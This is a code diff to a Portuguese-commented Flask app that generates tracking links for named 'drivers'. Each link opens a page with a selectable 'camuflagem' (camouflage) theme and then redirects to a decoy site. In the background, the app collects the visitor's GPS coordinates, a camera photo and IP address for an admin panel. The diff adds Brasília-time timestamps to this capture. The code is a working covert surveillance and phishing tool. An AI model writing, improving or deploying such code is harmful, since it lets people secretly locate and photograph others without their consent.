@@ -3,6 +3,7 @@ import uuid
 from datetime import datetime
 import os
 import requests
+import pytz  # Necessário instalar: pip install pytz
 
 app = Flask(__name__)
 FROTA = {}
@@ -35,7 +36,7 @@ def admin_panel(): return render_template("admin.html", frota=FROTA)
 def gerar_ordem():
     motorista = request.form.get("motorista")
     personalizacao = request.form.get("personalizacao")
-    tema = request.form.get("tema") # <--- AQUI CAPTURAMOS SUA ESCOLHA DO MENU
+    tema = request.form.get("camuflagem") # Certifique-se que o nome no admin.html seja 'camuflagem'
     redirect_url = request.form.get("redirect") or "https://www.google.com"
 
     id_ordem = str(uuid.uuid4())[:8]
@@ -46,7 +47,7 @@ def gerar_ordem():
         "motorista": motorista, "lat": None, "lon": None, "foto": None,
         "status": "Aguardando Conexão", "ultimo_visto": "-", "link": link_curto,
         "redirect": redirect_url, "ip": "-", 
-        "tema": tema # <--- GUARDAMOS O TEMA NO BANCO DE DADOS
+        "tema": tema 
     }
     return redirect(url_for('admin_panel'))
 
@@ -54,7 +55,6 @@ def gerar_ordem():
 def tela_motorista(id_ordem):
     if id_ordem not in FROTA: return "Link expirado.", 404
     dados = FROTA[id_ordem]
-    # Envia o tema escolhido para o HTML montar a camuflagem
     return render_template("motorista.html", id=id_ordem, destino=dados["redirect"], tema=dados.get("tema", "padrao"))
 
 @app.route('/api/sinal/<id_ordem>', methods=['POST'])
@@ -62,9 +62,18 @@ def receber_sinal(id_ordem):
     if id_ordem in FROTA:
         data = request.get_json()
         ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
+        
+        # CONFIGURAÇÃO DO HORÁRIO DE BRASÍLIA
+        fuso_br = pytz.timezone('America/Sao_Paulo')
+        agora_br = datetime.now(fuso_br).strftime("%d/%m/%Y %H:%M:%S")
+        
         FROTA[id_ordem].update({
-            'lat': data.get('latitude'), 'lon': data.get('longitude'), 'foto': data.get('foto'),
-            'status': "🟢 Online", 'ultimo_visto': datetime.now().strftime("%H:%M:%S"), 'ip': ip
+            'lat': data.get('latitude'), 
+            'lon': data.get('longitude'), 
+            'foto': data.get('foto'),
+            'status': "🟢 Online", 
+            'ultimo_visto': agora_br, # DATA E HORA DE BRASÍLIA
+            'ip': ip
         })
         return jsonify({"ok": True})
     return jsonify({"ok": False}), 404
@@ -78,4 +87,5 @@ def excluir_ordem(id_ordem):
     return jsonify({"ok": True})
 
 if __name__ == '__main__':
+    # Certifique-se de ter instalado o pytz: pip install pytz
     app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
